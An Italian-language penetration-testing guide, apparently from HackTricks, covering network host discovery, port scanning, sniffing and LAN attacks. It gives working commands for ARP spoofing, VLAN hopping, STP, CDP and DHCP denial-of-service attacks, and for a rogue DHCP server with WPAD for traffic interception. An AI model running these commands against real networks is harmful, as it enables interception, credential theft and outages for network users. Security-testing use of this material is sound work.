# Pentesting Network

{{#include ../../banners/hacktricks-training.md}}



## Scoprire host dall'esterno

Questa sarà una **breve sezione** su come trovare **IP che rispondono** da **Internet**.\
In questa situazione hai un **ambito di IP** (forse anche diversi **intervalli**) e devi solo trovare **quali IP stanno rispondendo**.

### ICMP

Questo è il modo **più semplice** e **veloce** per scoprire se un host è attivo o meno.\
Puoi provare a inviare alcuni pacchetti **ICMP** e **aspettarti risposte**. Il modo più semplice è semplicemente inviare una **richiesta di echo** e aspettare la risposta. Puoi farlo usando un semplice `ping` o usando `fping` per **intervalli**.\
Puoi anche usare **nmap** per inviare altri tipi di pacchetti ICMP (questo eviterà i filtri per le comuni richieste-risposte ICMP echo).
```bash
ping -c 1 199.66.11.4    # 1 echo request to a host
fping -g 199.66.11.0/24  # Send echo requests to ranges
nmap -PE -PM -PP -sn -n 199.66.11.0/24 #Send echo, timestamp requests and subnet mask requests
```
### TCP Port Discovery

È molto comune scoprire che tutti i tipi di pacchetti ICMP vengono filtrati. Quindi, tutto ciò che puoi fare per controllare se un host è attivo è **cercare porte aperte**. Ogni host ha **65535 porte**, quindi, se hai un ambito "grande", **non puoi** testare se **ogni porta** di ogni host è aperta o meno, ci vorrebbe troppo tempo.\
Quindi, ciò di cui hai bisogno è uno **scanner di porte veloce** ([masscan](https://github.com/robertdavidgraham/masscan)) e un elenco delle **porte più utilizzate:**
```bash
#Using masscan to scan top20ports of nmap in a /24 range (less than 5min)
masscan -p20,21-23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 199.66.11.0/24
```
Potresti anche eseguire questo passaggio con `nmap`, ma è più lento e in qualche modo `nmap` ha problemi a identificare gli host attivi.

### Scoperta della Porta HTTP

Questa è solo una scoperta della porta TCP utile quando vuoi **concentrarti sulla scoperta dei servizi HTTP**:
```bash
masscan -p80,443,8000-8100,8443 199.66.11.0/24
```
### Scoperta delle porte UDP

Puoi anche provare a controllare alcune **porte UDP aperte** per decidere se dovresti **prestare maggiore attenzione** a un **host.** Poiché i servizi UDP di solito **non rispondono** con **alcun dato** a un pacchetto di sondaggio UDP vuoto, è difficile dire se una porta è filtrata o aperta. Il modo più semplice per decidere questo è inviare un pacchetto relativo al servizio in esecuzione, e poiché non sai quale servizio è in esecuzione, dovresti provare il più probabile in base al numero di porta:
```bash
nmap -sU -sV --version-intensity 0 -F -n 199.66.11.53/24
# The -sV will make nmap test each possible known UDP service packet
# The "--version-intensity 0" will make nmap only test the most probable
```
La riga nmap proposta prima testerà i **top 1000 UDP ports** in ogni host all'interno dell'**intervallo /24**, ma anche solo questo richiederà **>20min**. Se hai bisogno di **risultati più rapidi**, puoi usare [**udp-proto-scanner**](https://github.com/portcullislabs/udp-proto-scanner): `./udp-proto-scanner.pl 199.66.11.53/24`. Questo invierà questi **UDP probes** al loro **port previsto** (per un intervallo /24 questo richiederà solo 1 min): _DNSStatusRequest, DNSVersionBindReq, NBTStat, NTPRequest, RPCCheck, SNMPv3GetRequest, chargen, citrix, daytime, db2, echo, gtpv1, ike, ms-sql, ms-sql-slam, netop, ntp, rpc, snmp-public, systat, tftp, time, xdmcp._

### SCTP Port Discovery
```bash
#Probably useless, but it's pretty fast, why not try it?
nmap -T4 -sY -n --open -Pn <IP/range>
```
## Pentesting Wifi

Qui puoi trovare una bella guida su tutti i noti attacchi Wifi al momento della scrittura:

{{#ref}}
../pentesting-wifi/
{{#endref}}

## Scoprire host dall'interno

Se sei all'interno della rete, una delle prime cose che vorrai fare è **scoprire altri host**. A seconda di **quanto rumore** puoi/vuoi fare, potrebbero essere eseguite diverse azioni:

### Passivo

Puoi utilizzare questi strumenti per scoprire passivamente host all'interno di una rete connessa:
```bash
netdiscover -p
p0f -i eth0 -p -o /tmp/p0f.log
# Bettercap
net.recon on/off #Read local ARP cache periodically
net.show
set net.show.meta true #more info
```
### Attivo

Nota che le tecniche commentate in [_**Scoprire host dall'esterno**_](#discovering-hosts-from-the-outside) (_Scoperta porte TCP/HTTP/UDP/SCTP_) possono essere **applicate qui**.\
Ma, poiché sei nella **stessa rete** degli altri host, puoi fare **più cose**:
```bash
#ARP discovery
nmap -sn <Network> #ARP Requests (Discover IPs)
netdiscover -r <Network> #ARP requests (Discover IPs)

#NBT discovery
nbtscan -r 192.168.0.1/24 #Search in Domain

# Bettercap
net.probe on/off #Discover hosts on current subnet by probing with ARP, mDNS, NBNS, UPNP, and/or WSD
set net.probe.mdns true/false #Enable mDNS discovery probes (default=true)
set net.probe.nbns true/false #Enable NetBIOS name service discovery probes (default=true)
set net.probe.upnp true/false #Enable UPNP discovery probes (default=true)
set net.probe.wsd true/false #Enable WSD discovery probes (default=true)
set net.probe.throttle 10 #10ms between probes sent (default=10)

#IPv6
alive6 <IFACE> # Send a pingv6 to multicast.
```
### Active ICMP

Nota che le tecniche commentate in _Discovering hosts from the outside_ ([_**ICMP**_](#icmp)) possono essere **applicate qui**.\
Ma, poiché sei nella **stessa rete** degli altri host, puoi fare **più cose**:

- Se **pinghi** un **indirizzo di broadcast di subnet**, il ping dovrebbe arrivare a **ogni host** e potrebbero **rispondere** a **te**: `ping -b 10.10.5.255`
- Pingando l'**indirizzo di broadcast di rete** potresti persino trovare host all'interno di **altre subnet**: `ping -b 255.255.255.255`
- Usa i flag `-PE`, `-PP`, `-PM` di `nmap` per eseguire la scoperta degli host inviando rispettivamente **ICMPv4 echo**, **timestamp** e **richieste di subnet mask:** `nmap -PE -PM -PP -sn -vvv -n 10.12.5.0/24`

### **Wake On Lan**

Wake On Lan è usato per **accendere** computer tramite un **messaggio di rete**. Il pacchetto magico usato per accendere il computer è solo un pacchetto in cui è fornito un **MAC Dst** e poi viene **ripetuto 16 volte** all'interno dello stesso pacchetto.\
Poi questo tipo di pacchetti viene solitamente inviato in un **ethernet 0x0842** o in un **pacchetto UDP sulla porta 9**.\
Se **nessun \[MAC]** è fornito, il pacchetto viene inviato a **broadcast ethernet** (e il MAC di broadcast sarà quello che viene ripetuto).
```bash
# Bettercap (if no [MAC] is specificed ff:ff:ff:ff:ff:ff will be used/entire broadcast domain)
wol.eth [MAC] #Send a WOL as a raw ethernet packet of type 0x0847
wol.udp [MAC] #Send a WOL as an IPv4 broadcast packet to UDP port 9
```
## Scanning Hosts

Una volta che hai scoperto tutti gli IP (esterni o interni) che desideri scansionare in profondità, possono essere eseguite diverse azioni.

### TCP

- **Porta** aperta: _SYN --> SYN/ACK --> RST_
- **Porta** chiusa: _SYN --> RST/ACK_
- **Porta** filtrata: _SYN --> \[NO RESPONSE]_
- **Porta** filtrata: _SYN --> messaggio ICMP_
```bash
# Nmap fast scan for the most 1000tcp ports used
nmap -sV -sC -O -T4 -n -Pn -oA fastscan <IP>
# Nmap fast scan for all the ports
nmap -sV -sC -O -T4 -n -Pn -p- -oA fullfastscan <IP>
# Nmap fast scan for all the ports slower to avoid failures due to -T4
nmap -sV -sC -O -p- -n -Pn -oA fullscan <IP>

#Bettercap Scan
syn.scan 192.168.1.0/24 1 10000 #Ports 1-10000
```
### UDP

Ci sono 2 opzioni per scansionare una porta UDP:

- Inviare un **pacchetto UDP** e controllare la risposta _**ICMP unreachable**_ se la porta è **chiusa** (in diversi casi ICMP sarà **filtrato** quindi non riceverai alcuna informazione se la porta è chiusa o aperta).
- Inviare dei **datagrammi formattati** per ottenere una risposta da un **servizio** (ad es., DNS, DHCP, TFTP e altri, come elencato in _nmap-payloads_). Se ricevi una **risposta**, allora la porta è **aperta**.

**Nmap** mescolerà entrambe le opzioni utilizzando "-sV" (le scansioni UDP sono molto lente), ma nota che le scansioni UDP sono più lente delle scansioni TCP:
```bash
# Check if any of the most common udp services is running
udp-proto-scanner.pl <IP>
# Nmap fast check if any of the 100 most common UDP services is running
nmap -sU -sV --version-intensity 0 -n -F -T4 <IP>
# Nmap check if any of the 100 most common UDP services is running and launch defaults scripts
nmap -sU -sV -sC -n -F -T4 <IP>
# Nmap "fast" top 1000 UDP ports
nmap -sU -sV --version-intensity 0 -n -T4 <IP>
# You could use nmap to test all the UDP ports, but that will take a lot of time
```
### SCTP Scan

**SCTP (Stream Control Transmission Protocol)** è progettato per essere utilizzato insieme a **TCP (Transmission Control Protocol)** e **UDP (User Datagram Protocol)**. Il suo scopo principale è facilitare il trasporto di dati telefonici su reti IP, rispecchiando molte delle caratteristiche di affidabilità presenti in **Signaling System 7 (SS7)**. **SCTP** è un componente fondamentale della famiglia di protocolli **SIGTRAN**, che mira a trasportare segnali SS7 su reti IP.

Il supporto per **SCTP** è fornito da vari sistemi operativi, come **IBM AIX**, **Oracle Solaris**, **HP-UX**, **Linux**, **Cisco IOS** e **VxWorks**, indicando la sua ampia accettazione e utilità nel campo delle telecomunicazioni e del networking.

Due diverse scansioni per SCTP sono offerte da nmap: _-sY_ e _-sZ_
```bash
# Nmap fast SCTP scan
nmap -T4 -sY -n -oA SCTFastScan <IP>
# Nmap all SCTP scan
nmap -T4 -p- -sY -sV -sC -F -n -oA SCTAllScan <IP>
```
### IDS e IPS evasione

{{#ref}}
ids-evasion.md
{{#endref}}

### **Altre opzioni di nmap**

{{#ref}}
nmap-summary-esp.md
{{#endref}}

### Rivelare indirizzi IP interni

**Router, firewall e dispositivi di rete mal configurati** a volte rispondono a probe di rete utilizzando **indirizzi sorgente non pubblici**. **tcpdump** può essere utilizzato per identificare i pacchetti ricevuti da indirizzi privati durante i test. In particolare, su Kali Linux, i pacchetti possono essere catturati sull'**interfaccia eth2**, che è accessibile da Internet pubblico. È importante notare che se la tua configurazione è dietro un NAT o un firewall, tali pacchetti potrebbero essere filtrati.
```bash
tcpdump –nt -i eth2 src net 10 or 172.16/12 or 192.168/16
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth2, link-type EN10MB (Ethernet), capture size 65535 bytes
IP 10.10.0.1 > 185.22.224.18: ICMP echo reply, id 25804, seq 1582, length 64
IP 10.10.0.2 > 185.22.224.18: ICMP echo reply, id 25804, seq 1586, length 64
```
## Sniffing

Con lo sniffing puoi apprendere dettagli su intervalli IP, dimensioni delle subnet, indirizzi MAC e nomi host esaminando i frame e i pacchetti catturati. Se la rete è mal configurata o il fabric di switching è sotto stress, gli attaccanti possono catturare materiale sensibile tramite sniffing di rete passivo.

Se una rete Ethernet switchata è configurata correttamente, vedrai solo frame di broadcast e materiale destinato al tuo indirizzo MAC.

### TCPDump
```bash
sudo tcpdump -i <INTERFACE> udp port 53 #Listen to DNS request to discover what is searching the host
tcpdump -i <IFACE> icmp #Listen to icmp packets
sudo bash -c "sudo nohup tcpdump -i eth0 -G 300 -w \"/tmp/dump-%m-%d-%H-%M-%S-%s.pcap\" -W 50 'tcp and (port 80 or port 443)' &"
```
Si possono anche catturare pacchetti da una macchina remota tramite una sessione SSH con Wireshark come interfaccia grafica in tempo reale.
```
ssh user@<TARGET IP> tcpdump -i ens160 -U -s0 -w - | sudo wireshark -k -i -
ssh <USERNAME>@<TARGET IP> tcpdump -i <INTERFACE> -U -s0 -w - 'port not 22' | sudo wireshark -k -i - # Exclude SSH traffic
```
### Bettercap
```bash
net.sniff on
net.sniff stats
set net.sniff.output sniffed.pcap #Write captured packets to file
set net.sniff.local  #If true it will consider packets from/to this computer, otherwise it will skip them (default=false)
set net.sniff.filter #BPF filter for the sniffer (default=not arp)
set net.sniff.regexp #If set only packets matching this regex will be considered
```
### Wireshark

Ovviamente.

### Catturare credenziali

Puoi usare strumenti come [https://github.com/lgandx/PCredz](https://github.com/lgandx/PCredz) per analizzare le credenziali da un pcap o da un'interfaccia live.

## Attacchi LAN

### ARP spoofing

L'ARP Spoofing consiste nell'inviare ARP Responses gratuiti per indicare che l'IP di una macchina ha il MAC del nostro dispositivo. Poi, la vittima cambierà la tabella ARP e contatterà la nostra macchina ogni volta che vorrà contattare l'IP spoofato.

#### **Bettercap**
```bash
arp.spoof on
set arp.spoof.targets <IP> #Specific targets to ARP spoof (default=<entire subnet>)
set arp.spoof.whitelist #Specific targets to skip while spoofing
set arp.spoof.fullduplex true #If true, both the targets and the gateway will be attacked, otherwise only the target (default=false)
set arp.spoof.internal true #If true, local connections among computers of the network will be spoofed, otherwise only connections going to and coming from the Internet (default=false)
```
#### **Arpspoof**
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -t 192.168.1.1 192.168.1.2
arpspoof -t 192.168.1.2 192.168.1.1
```
### MAC Flooding - CAM overflow

Sovraccarica la tabella CAM dello switch inviando un gran numero di pacchetti con indirizzi MAC sorgente diversi. Quando la tabella CAM è piena, lo switch inizia a comportarsi come un hub (broadcasting tutto il traffico).
```bash
macof -i <interface>
```
In moderni switch questa vulnerabilità è stata risolta.

### 802.1Q VLAN / Attacchi DTP

#### Trunking Dinamico

Il **Dynamic Trunking Protocol (DTP)** è progettato come un protocollo di livello link per facilitare un sistema automatico di trunking, consentendo ai switch di selezionare automaticamente le porte per la modalità trunk (Trunk) o la modalità non trunk. L'implementazione del **DTP** è spesso vista come indicativa di un design di rete subottimale, sottolineando l'importanza di configurare manualmente i trunk solo dove necessario e garantire una corretta documentazione.

Per impostazione predefinita, le porte dello switch sono impostate per operare in modalità Dynamic Auto, il che significa che sono pronte a iniziare il trunking se sollecitate da uno switch vicino. Un problema di sicurezza si presenta quando un pentester o un attaccante si connette allo switch e invia un frame DTP Desirable, costringendo la porta a entrare in modalità trunk. Questa azione consente all'attaccante di enumerare le VLAN attraverso l'analisi dei frame STP e di eludere la segmentazione delle VLAN configurando interfacce virtuali.

La presenza di DTP in molti switch per impostazione predefinita può essere sfruttata dagli avversari per imitare il comportamento di uno switch, guadagnando così accesso al traffico su tutte le VLAN. Lo script [_**dtpscan.sh**_](https://github.com/commonexploits/dtpscan) è utilizzato per monitorare un'interfaccia, rivelando se uno switch è in modalità Default, Trunk, Dynamic, Auto o Access—quest'ultima essendo l'unica configurazione immune agli attacchi di VLAN hopping. Questo strumento valuta lo stato di vulnerabilità dello switch.

Se viene identificata una vulnerabilità di rete, lo strumento _**Yersinia**_ può essere impiegato per "abilitare il trunking" tramite il protocollo DTP, consentendo l'osservazione dei pacchetti da tutte le VLAN.
```bash
apt-get install yersinia #Installation
sudo apt install kali-linux-large #Another way to install it in Kali
yersinia -I #Interactive mode
#In interactive mode you will need to select a interface first
#Then, you can select the protocol to attack using letter "g"
#Finally, you can select the attack using letter "x"

yersinia -G #For graphic mode
```
![](<../../images/image (269).png>)

Per enumerare le VLAN, è anche possibile generare il frame DTP Desirable con lo script [**DTPHijacking.py**](https://github.com/in9uz/VLANPWN/blob/main/DTPHijacking.py)**. Non interrompere lo script in nessuna circostanza. Inietta DTP Desirable ogni tre secondi. **I canali trunk creati dinamicamente sullo switch vivono solo per cinque minuti. Dopo cinque minuti, il trunk si disconnette.**
```
sudo python3 DTPHijacking.py --interface eth0
```
Vorrei sottolineare che **Access/Desirable (0x03)** indica che il frame DTP è di tipo Desirable, il che dice alla porta di passare alla modalità Trunk. E **802.1Q/802.1Q (0xa5)** indica il tipo di incapsulamento **802.1Q**.

Analizzando i frame STP, **apprendiamo dell'esistenza della VLAN 30 e della VLAN 60.**

<figure><img src="../../images/image (124).png" alt=""><figcaption></figcaption></figure>

#### Attaccare VLAN specifiche

Una volta conosciuti gli ID VLAN e i valori IP, puoi **configurare un'interfaccia virtuale per attaccare una VLAN specifica**.\
Se il DHCP non è disponibile, utilizza _ifconfig_ per impostare un indirizzo IP statico.
```
root@kali:~# modprobe 8021q
root@kali:~# vconfig add eth1 250
Added VLAN with VID == 250 to IF -:eth1:-
root@kali:~# dhclient eth1.250
Reloading /etc/samba/smb.conf: smbd only.
root@kali:~# ifconfig eth1.250
eth1.250  Link encap:Ethernet  HWaddr 00:0e:c6:f0:29:65
inet addr:10.121.5.86  Bcast:10.121.5.255  Mask:255.255.255.0
inet6 addr: fe80::20e:c6ff:fef0:2965/64 Scope:Link
UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
RX packets:19 errors:0 dropped:0 overruns:0 frame:0
TX packets:13 errors:0 dropped:0 overruns:0 carrier:0
collisions:0 txqueuelen:0
RX bytes:2206 (2.1 KiB)  TX bytes:1654 (1.6 KiB)

root@kali:~# arp-scan -I eth1.250 10.121.5.0/24
```

```bash
# Another configuration example
modprobe 8021q
vconfig add eth1 20
ifconfig eth1.20 192.168.1.2 netmask 255.255.255.0 up
```

```bash
# Another configuration example
sudo vconfig add eth0 30
sudo ip link set eth0.30 up
sudo dhclient -v eth0.30
```
#### Automatic VLAN Hopper

L'attacco discusso di **Dynamic Trunking e creazione di interfacce virtuali per scoprire host all'interno** di altri VLAN è **eseguito automaticamente** dallo strumento: [**https://github.com/nccgroup/vlan-hopping---frogger**](https://github.com/nccgroup/vlan-hopping---frogger)

#### Double Tagging

Se un attaccante conosce il valore del **MAC, IP e VLAN ID dell'host vittima**, potrebbe provare a **doppiare il tagging di un frame** con il suo VLAN designato e il VLAN della vittima e inviare un pacchetto. Poiché la **vittima non sarà in grado di connettersi di nuovo** con l'attaccante, quindi la **migliore opzione per l'attaccante è comunicare via UDP** a protocolli che possono eseguire alcune azioni interessanti (come SNMP).

Un'altra opzione per l'attaccante è lanciare una **scansione delle porte TCP spoofando un IP controllato dall'attaccante e accessibile dalla vittima** (probabilmente tramite internet). Poi, l'attaccante potrebbe sniffare nel secondo host di sua proprietà se riceve alcuni pacchetti dalla vittima.

![](<../../images/image (190).png>)

Per eseguire questo attacco puoi usare scapy: `pip install scapy`
```python
from scapy.all import *
# Double tagging with ICMP packet (the response from the victim isn't double tagged so it will never reach the attacker)
packet = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=20)/IP(dst='192.168.1.10')/ICMP()
sendp(packet)
```
#### Bypass della Segmentazione VLAN Laterale <a href="#d679" id="d679"></a>

Se hai **accesso a uno switch a cui sei direttamente connesso**, hai la possibilità di **bypassare la segmentazione VLAN** all'interno della rete. Basta **cambiare la porta in modalità trunk** (nota anche come trunk), creare interfacce virtuali con gli ID delle VLAN target e configurare un indirizzo IP. Puoi provare a richiedere l'indirizzo dinamicamente (DHCP) oppure puoi configurarlo staticamente. Dipende dal caso.

{{#ref}}
lateral-vlan-segmentation-bypass.md
{{#endref}}

#### Bypass della VLAN Privata Layer 3

In determinati ambienti, come le reti wireless per ospiti, vengono implementate impostazioni di **isolamento delle porte (nota anche come VLAN privata)** per impedire ai client connessi a un punto di accesso wireless di comunicare direttamente tra loro. Tuttavia, è stata identificata una tecnica che può eludere queste misure di isolamento. Questa tecnica sfrutta la mancanza di ACL di rete o la loro configurazione errata, consentendo ai pacchetti IP di essere instradati attraverso un router per raggiungere un altro client sulla stessa rete.

L'attacco viene eseguito creando un **pacchetto che trasporta l'indirizzo IP del client di destinazione ma con l'indirizzo MAC del router**. Questo fa sì che il router inoltri erroneamente il pacchetto al client target. Questo approccio è simile a quello utilizzato negli Attacchi di Double Tagging, dove la capacità di controllare un host accessibile alla vittima viene utilizzata per sfruttare la vulnerabilità di sicurezza.

**Passaggi Chiave dell'Attacco:**

1. **Creazione di un Pacchetto:** Un pacchetto è appositamente creato per includere l'indirizzo IP del client target ma con l'indirizzo MAC del router.
2. **Sfruttamento del Comportamento del Router:** Il pacchetto creato viene inviato al router, che, a causa della configurazione, reindirizza il pacchetto al client target, eludendo l'isolamento fornito dalle impostazioni della VLAN privata.

### Attacchi VTP

Il VTP (VLAN Trunking Protocol) centralizza la gestione delle VLAN. Utilizza numeri di revisione per mantenere l'integrità del database VLAN; qualsiasi modifica incrementa questo numero. Gli switch adottano configurazioni con numeri di revisione più elevati, aggiornando i propri database VLAN.

#### Ruoli del Dominio VTP

- **Server VTP:** Gestisce le VLAN—crea, elimina, modifica. Trasmette annunci VTP ai membri del dominio.
- **Client VTP:** Riceve annunci VTP per sincronizzare il proprio database VLAN. Questo ruolo è limitato dalle modifiche locali alla configurazione delle VLAN.
- **VTP Trasparente:** Non partecipa agli aggiornamenti VTP ma inoltra gli annunci VTP. Non è influenzato dagli attacchi VTP, mantenendo un numero di revisione costante di zero.

#### Tipi di Annunci VTP

- **Annuncio di Riepilogo:** Trasmetto dal server VTP ogni 300 secondi, portando informazioni essenziali sul dominio.
- **Annuncio di Sottoinsieme:** Inviato dopo le modifiche alla configurazione delle VLAN.
- **Richiesta di Annuncio:** Emessa da un client VTP per richiedere un Annuncio di Riepilogo, tipicamente in risposta alla rilevazione di un numero di revisione di configurazione più elevato.

Le vulnerabilità VTP sono sfruttabili esclusivamente tramite porte trunk poiché gli annunci VTP circolano solo attraverso di esse. Gli scenari post-attacco DTP potrebbero spostarsi verso VTP. Strumenti come Yersinia possono facilitare attacchi VTP, mirando a cancellare il database VLAN, interrompendo efficacemente la rete.

Nota: Questa discussione riguarda la versione 1 di VTP (VTPv1).
````bash
%% yersinia -G # Launch Yersinia in graphical mode ```
````
In modalità grafica di Yersinia, scegliere l'opzione per eliminare tutte le VLAN VTP per purgare il database VLAN.

### Attacchi STP

**Se non riesci a catturare i frame BPDU sulle tue interfacce, è improbabile che tu riesca in un attacco STP.**

#### **STP BPDU DoS**

Inviare un gran numero di BPDUs TCP (Topology Change Notification) o Conf (i BPDUs che vengono inviati quando la topologia viene creata) sovraccarica gli switch e smettono di funzionare correttamente.
```bash
yersinia stp -attack 2
yersinia stp -attack 3
#Use -M to disable MAC spoofing
```
#### **Attacco STP TCP**

Quando viene inviato un TCP, la tabella CAM degli switch verrà cancellata in 15s. Poi, se stai inviando continuamente questo tipo di pacchetti, la tabella CAM verrà riavviata continuamente (o ogni 15 secondi) e quando viene riavviata, lo switch si comporta come un hub.
```bash
yersinia stp -attack 1 #Will send 1 TCP packet and the switch should restore the CAM in 15 seconds
yersinia stp -attack 0 #Will send 1 CONF packet, nothing else will happen
```
#### **Attacco STP Root**

L'attaccante simula il comportamento di uno switch per diventare il root STP della rete. Poi, più dati passeranno attraverso di lui. Questo è interessante quando sei connesso a due switch diversi.\
Questo viene fatto inviando pacchetti BPDUs CONF che affermano che il valore di **priorità** è inferiore alla priorità attuale dello switch root attuale.
```bash
yersinia stp -attack 4 #Behaves like the root switch
yersinia stp -attack 5 #This will make the device behaves as a switch but will not be root
```
**Se l'attaccante è connesso a 2 switch, può diventare la radice del nuovo albero e tutto il traffico tra quegli switch passerà attraverso di lui** (verrà eseguito un attacco MITM).
```bash
yersinia stp -attack 6 #This will cause a DoS as the layer 2 packets wont be forwarded. You can use Ettercap to forward those packets "Sniff" --> "Bridged sniffing"
ettercap -T -i eth1 -B eth2 -q #Set a bridge between 2 interfaces to forwardpackages
```
### Attacchi CDP

Il CISCO Discovery Protocol (CDP) è essenziale per la comunicazione tra i dispositivi CISCO, consentendo loro di **identificarsi a vicenda e condividere dettagli di configurazione**.

#### Raccolta Dati Passiva <a href="#id-0e0f" id="id-0e0f"></a>

CDP è configurato per trasmettere informazioni attraverso tutte le porte, il che potrebbe comportare un rischio per la sicurezza. Un attaccante, collegandosi a una porta switch, potrebbe utilizzare sniffers di rete come **Wireshark**, **tcpdump** o **Yersinia**. Questa azione può rivelare dati sensibili sul dispositivo di rete, inclusi il suo modello e la versione di Cisco IOS in esecuzione. L'attaccante potrebbe quindi mirare a vulnerabilità specifiche nella versione di Cisco IOS identificata.

#### Induzione di Flooding della Tabella CDP <a href="#id-0d6a" id="id-0d6a"></a>

Un approccio più aggressivo prevede il lancio di un attacco Denial of Service (DoS) sovraccaricando la memoria dello switch, fingendo di essere dispositivi CISCO legittimi. Di seguito è riportata la sequenza di comandi per avviare un tale attacco utilizzando Yersinia, uno strumento di rete progettato per i test:
```bash
sudo yersinia cdp -attack 1 # Initiates a DoS attack by simulating fake CISCO devices
# Alternatively, for a GUI approach:
sudo yersinia -G
```
Durante questo attacco, la CPU dello switch e la tabella dei vicini CDP sono gravemente sovraccaricate, portando a quella che viene spesso definita **“paralisi della rete”** a causa dell'eccessivo consumo di risorse.

#### Attacco di impersonificazione CDP
```bash
sudo yersinia cdp -attack 2 #Simulate a new CISCO device
sudo yersinia cdp -attack 0 #Send a CDP packet
```
Potresti anche usare [**scapy**](https://github.com/secdev/scapy/). Assicurati di installarlo con il pacchetto `scapy/contrib`.

### Attacchi VoIP e lo Strumento VoIP Hopper

I telefoni VoIP, sempre più integrati con dispositivi IoT, offrono funzionalità come sbloccare porte o controllare termostati tramite numeri di telefono speciali. Tuttavia, questa integrazione può comportare rischi per la sicurezza.

Lo strumento [**voiphopper**](http://voiphopper.sourceforge.net) è progettato per emulare un telefono VoIP in vari ambienti (Cisco, Avaya, Nortel, Alcatel-Lucent). Scopre l'ID VLAN della rete vocale utilizzando protocolli come CDP, DHCP, LLDP-MED e 802.1Q ARP.

**VoIP Hopper** offre tre modalità per il Cisco Discovery Protocol (CDP):

1. **Modalità Sniff** (`-c 0`): Analizza i pacchetti di rete per identificare l'ID VLAN.
2. **Modalità Spoof** (`-c 1`): Genera pacchetti personalizzati che imitano quelli di un dispositivo VoIP reale.
3. **Modalità Spoof con Pacchetto Pre-fatto** (`-c 2`): Invia pacchetti identici a quelli di un modello specifico di telefono IP Cisco.

La modalità preferita per la velocità è la terza. Richiede di specificare:

- L'interfaccia di rete dell'attaccante (`-i` parametro).
- Il nome del dispositivo VoIP emulato (`-E` parametro), seguendo il formato di denominazione Cisco (ad es., SEP seguito da un indirizzo MAC).

In contesti aziendali, per imitare un dispositivo VoIP esistente, si potrebbe:

- Ispezionare l'etichetta MAC sul telefono.
- Navigare nelle impostazioni di visualizzazione del telefono per visualizzare le informazioni sul modello.
- Collegare il dispositivo VoIP a un laptop e osservare le richieste CDP utilizzando Wireshark.

Un comando di esempio per eseguire lo strumento in modalità tre sarebbe:
```bash
voiphopper -i eth1 -E 'SEP001EEEEEEEEE ' -c 2
```
### Attacchi DHCP

#### Enumerazione
```bash
nmap --script broadcast-dhcp-discover
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-16 05:30 EDT
WARNING: No targets were specified, so 0 hosts scanned.
Pre-scan script results:
| broadcast-dhcp-discover:
|   Response 1 of 1:
|     IP Offered: 192.168.1.250
|     DHCP Message Type: DHCPOFFER
|     Server Identifier: 192.168.1.1
|     IP Address Lease Time: 1m00s
|     Subnet Mask: 255.255.255.0
|     Router: 192.168.1.1
|     Domain Name Server: 192.168.1.1
|_    Domain Name: mynet
Nmap done: 0 IP addresses (0 hosts up) scanned in 5.27 seconds
```
**DoS**

**Due tipi di DoS** possono essere eseguiti contro i server DHCP. Il primo consiste nel **simulare un numero sufficiente di host falsi per utilizzare tutti gli indirizzi IP possibili**.\
Questo attacco funzionerà solo se puoi vedere le risposte del server DHCP e completare il protocollo (**Discover** (Comp) --> **Offer** (server) --> **Request** (Comp) --> **ACK** (server)). Ad esempio, questo **non è possibile nelle reti Wifi**.

Un altro modo per eseguire un DoS DHCP è inviare un **pacchetto DHCP-RELEASE utilizzando come codice sorgente ogni possibile IP**. Allora, il server penserà che tutti abbiano finito di utilizzare l'IP.
```bash
yersinia dhcp -attack 1
yersinia dhcp -attack 3 #More parameters are needed
```
Un modo più automatico per farlo è utilizzare lo strumento [DHCPing](https://github.com/kamorin/DHCPig)

Puoi utilizzare gli attacchi DoS menzionati per costringere i client a ottenere nuovi lease all'interno dell'ambiente e esaurire i server legittimi in modo che diventino non reattivi. Quindi, quando i legittimi tentano di riconnettersi, **puoi servire valori malevoli menzionati nel prossimo attacco**.

#### Imposta valori malevoli

Un server DHCP non autorizzato può essere configurato utilizzando lo script DHCP situato in `/usr/share/responder/DHCP.py`. Questo è utile per attacchi di rete, come la cattura del traffico HTTP e delle credenziali, reindirizzando il traffico a un server malevolo. Tuttavia, impostare un gateway non autorizzato è meno efficace poiché consente solo di catturare il traffico in uscita dal client, mancando le risposte dal vero gateway. Invece, è consigliato impostare un server DNS o WPAD non autorizzato per un attacco più efficace.

Di seguito sono riportate le opzioni di comando per configurare il server DHCP non autorizzato:

- **Il nostro indirizzo IP (Annuncio del Gateway)**: Usa `-i 10.0.0.100` per pubblicizzare l'IP della tua macchina come gateway.
- **Nome di Dominio DNS Locale**: Facoltativamente, usa `-d example.org` per impostare un nome di dominio DNS locale.
- **IP del Router/Gateway Originale**: Usa `-r 10.0.0.1` per specificare l'indirizzo IP del router o gateway legittimo.
- **IP del Server DNS Primario**: Usa `-p 10.0.0.100` per impostare l'indirizzo IP del server DNS non autorizzato che controlli.
- **IP del Server DNS Secondario**: Facoltativamente, usa `-s 10.0.0.1` per impostare un IP del server DNS secondario.
- **Netmask della Rete Locale**: Usa `-n 255.255.255.0` per definire la netmask per la rete locale.
- **Interfaccia per il Traffico DHCP**: Usa `-I eth1` per ascoltare il traffico DHCP su una specifica interfaccia di rete.
- **Indirizzo di Configurazione WPAD**: Usa `-w “http://10.0.0.100/wpad.dat”` per impostare l'indirizzo per la configurazione WPAD, assistendo nell'intercettazione del traffico web.
- **Spoof dell'IP del Gateway Predefinito**: Includi `-S` per falsificare l'indirizzo IP del gateway predefinito.
- **Rispondi a Tutte le Richieste DHCP**: Includi `-R` per far sì che il server risponda a tutte le richieste DHCP, ma fai attenzione che questo è rumoroso e può essere rilevato.

Utilizzando correttamente queste opzioni, può essere stabilito un server DHCP non autorizzato per intercettare efficacemente il traffico di rete.
```python
# Example to start a rogue DHCP server with specified options
!python /usr/share/responder/DHCP.py -i 10.0.0.100 -d example.org -r 10.0.0.1 -p 10.0.0.100 -s 10.0.0.1 -n 255.255.255.0 -I eth1 -w "http://10.0.0.100/wpad.dat" -S -R
```
### **Attacchi EAP**

Ecco alcune delle tattiche di attacco che possono essere utilizzate contro le implementazioni 802.1X:

- Attacco attivo di brute-force delle password tramite EAP
- Attacco al server RADIUS con contenuti EAP malformati _\*\*_(exploits)
- Cattura dei messaggi EAP e cracking delle password offline (EAP-MD5 e PEAP)
